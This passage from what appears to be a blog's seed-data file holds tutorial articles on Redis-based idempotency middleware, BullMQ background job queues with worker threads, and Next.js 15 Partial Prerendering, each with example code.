<p>Clients generate a unique UUID v4 token (e.g. <code>Idempotency-Key: 9b1deb4d-3b7d-4bad-9bdd-2b0d7b3dcb6d</code>) and include it in the HTTP request headers. The server checks whether this key has already been processed before executing balance mutations.</p>

<pre><code>// Production-grade Idempotency Middleware using Redis & Atomic Locking
import Redis from 'ioredis';

const redis = new Redis();

export const idempotencyGuard = async (req, res, next) => {
  const idempotencyKey = req.headers['idempotency-key'];
  if (!idempotencyKey) return next();

  const lockKey = \`lock:idempotency:\${idempotencyKey}\`;
  const responseKey = \`response:idempotency:\${idempotencyKey}\`;

  // 1. Check if an identical request was already finalized
  const cachedResponse = await redis.get(responseKey);
  if (cachedResponse) {
    const { status, body } = JSON.parse(cachedResponse);
    return res.status(status).json({ ...body, _idempotentReplay: true });
  }

  // 2. Acquire atomic distributed mutex lock (10s TTL) to prevent race conditions
  const acquired = await redis.set(lockKey, 'in_progress', 'NX', 'EX', 10);
  if (!acquired) {
    return res.status(409).json({
      success: false,
      message: 'A transaction with this Idempotency-Key is currently being processed. Please wait.',
    });
  }

  // 3. Intercept res.json to cache the response payload for future retries
  const originalJson = res.json.bind(res);
  res.json = (body) => {
    // Cache the response for 24 hours
    redis.set(responseKey, JSON.stringify({ status: res.statusCode, body }), 'EX', 86400);
    redis.del(lockKey); // Release lock
    return originalJson(body);
  };

  next();
};</code></pre>

<h2>2. Handling Webhook Retries Safely</h2>
<p>Third-party payment gateways (Stripe, Razorpay) dispatch webhooks asynchronously and retry them repeatedly until receiving an HTTP <code>200 OK</code> response. We ensure safety by validating cryptographic webhook signatures (HMAC SHA-256) and recording every processed event ID in an audit ledger.</p>`,
  },
  {
    title: 'Reliable Background Task Processing with BullMQ, Redis, and Worker Threads',
    category: 'javascript',
    readTime: '9 min read',
    image: 'https://images.unsplash.com/photo-1550751827-4bd374c3f58b?auto=format&fit=crop&w=1200&q=80',
    tags: ['Node.js', 'BullMQ', 'Worker Threads', 'Async', 'Queues'],
    authorName: 'Shivangi Singh',
    authorAvatar: '/shivangi.jpg',
    views: 3410,
    numberOfLikes: 245,
    content: `<p class="lead">One of the most dangerous architectural anti-patterns in Node.js applications is running compute-intensive operations—such as video transcoding, image compression, PDF receipt generation, or massive CSV exports—directly inside synchronous Express request handlers. Because Node.js operates on a single main event loop, running heavy compute starves all incoming requests, causing severe latency spikes across the entire platform.</p>

<div class="my-6 p-4 rounded-2xl bg-indigo-50/70 dark:bg-indigo-950/40 border border-indigo-200 dark:border-indigo-800 text-sm">
  ⏱️ <strong>Event Loop Starvation:</strong> If a route takes 2.5 seconds to generate an analytics report, no other HTTP request can be answered during that window. Every client connection freezes until the synchronous CPU task completes.
</div>

<h2>1. The Producer-Consumer Queue Architecture with BullMQ</h2>
<p>By decoupling job submission from job execution using <strong>BullMQ</strong> backed by Redis streams, HTTP handlers respond to clients in under <strong>15ms</strong> with an HTTP <code>202 Accepted</code> status, delegating execution to dedicated background workers:</p>

<pre><code>// 1. HTTP Producer Route
import { Queue } from 'bullmq';

const reportQueue = new Queue('reports', {
  connection: { host: '127.0.0.1', port: 6379 },
});

export const requestReportHandler = async (req, res) => {
  const { userId, dateRange } = req.body;

  // Enqueue job with priority and automatic retry rules
  const job = await reportQueue.add(
    'generateMonthlyReport',
    { userId, dateRange },
    {
      attempts: 3,
      backoff: { type: 'exponential', delay: 2000 },
      removeOnComplete: true,
    }
  );

  res.status(202).json({
    success: true,
    message: 'Report request accepted and queued for processing.',
    jobId: job.id,
  });
};</code></pre>

<h2>2. Isolating Heavy Compute in Node.js Worker Threads</h2>
<p>For truly CPU-bound calculations, instantiate isolated OS threads using <code>node:worker_threads</code> to ensure the background job execution itself never degrades event loop throughput.</p>`,
  },
  {
    title: 'Next.js 15 Deep Dive: Partial Prerendering, Server Actions & Streaming SSR',
    category: 'nextjs',
    readTime: '9 min read',
    image: 'https://images.unsplash.com/photo-1507238691740-187a5b1d37b8?auto=format&fit=crop&w=1200&q=80',
    tags: ['Next.js', 'React', 'SSR', 'Web Performance', 'Cloud'],
    authorName: 'Shivangi Singh',
    authorAvatar: '/shivangi.jpg',
    views: 4120,
    numberOfLikes: 334,
    content: `<p class="lead">Historically, frontend web architecture forced developers into a difficult compromise: you could either generate fast, static HTML at build time (SSG) that could be cached on edge CDNs but couldn't show personalized user data, or you could render dynamically on every request (SSR), which supported real-time personalization but suffered from slower Time to First Byte (TTFB). Next.js 15 eliminates this trade-off entirely with <strong>Partial Prerendering (PPR)</strong>.</p>

<div class="my-6 p-4 rounded-2xl bg-indigo-50/70 dark:bg-indigo-950/40 border border-indigo-200 dark:border-indigo-800 text-sm">
  🚀 <strong>What is Partial Prerendering?</strong> PPR delivers a static, pre-rendered HTML shell instantly from the CDN edge in under 20ms, while concurrently streaming dynamic, personalized components (such as user profiles and recommendations) over the same persistent HTTP connection using React Suspense.
</div>

<h2>1. Implementing Partial Prerendering with React Suspense</h2>
<p>In Next.js 15, you declare dynamic regions by wrapping components in standard <code>Suspense</code> boundaries:</p>

<pre><code>// app/page.jsx (Next.js 15 PPR Architecture)
import { Suspense } from 'react';
import StaticHeroBanner from '@/components/StaticHeroBanner';
import DynamicUserFeed from '@/components/DynamicUserFeed';
import FeedSkeleton from '@/components/FeedSkeleton';

export const experimental_ppr = true; // Enable Partial Prerendering

export default function HomePage() {
  return (
    &lt;main className="max-w-6xl mx-auto py-12 px-4"&gt;
      {/* 1. Static Shell: Served immediately from edge CDN in &lt;25ms */}
      &lt;StaticHeroBanner /&gt;

      {/* 2. Dynamic Hole: Streams in over HTTP connection as data resolves */}
      &lt;Suspense fallback={&lt;FeedSkeleton /&gt;}&gt;
        &lt;DynamicUserFeed /&gt;
      &lt;/Suspense&gt;
    &lt;/main&gt;
  );
}</code></pre>

<h2>2. Core Web Vitals Impact</h2>
<table class="w-full text-left text-sm border my-6">
  <thead>
    <tr class="border-b bg-slate-100 dark:bg-slate-800">
      <th class="p-3 font-bold">Web Vital Metric</th>
      <th class="p-3 font-bold">Standard Dynamic SSR</th>
      <th class="p-3 font-bold">Next.js 15 Partial Prerendering</th>
      <th class="p-3 font-bold text-emerald-600">Improvement</th>
    </tr>
  </thead>
  <tbody>
    <tr class="border-b">
      <td class="p-3 font-medium">Time to First Byte (TTFB)</td>
      <td class="p-3 text-red-500 font-mono">420 ms</td>
      <td class="p-3 text-emerald-500 font-mono font-bold">18 ms</td>
      <td class="p-3 text-emerald-600 font-semibold">95.7% faster</td>
    </tr>
    <tr class="border-b">
      <td class="p-3 font-medium">First Contentful Paint (FCP)</td>
      <td class="p-3 text-red-500 font-mono">890 ms</td>
      <td class="p-3 text-emerald-500 font-mono font-bold">95 ms</td>
      <td class="p-3 text-emerald-600 font-semibold">Instant shell delivery</td>
    </tr>
    <tr class="border-b">
      <td class="p-3 font-medium">Cumulative Layout Shift (CLS)</td>
      <td class="p-3 font-mono">0.14 (Moderate)</td>
      <td class="p-3 font-mono font-bold text-emerald-500">0.00 (Zero Shift)</td>
      <td class="p-3 text-emerald-600 font-semibold">Perfect stability</td>
    </tr>
  </tbody>
</table>`,
  },
];
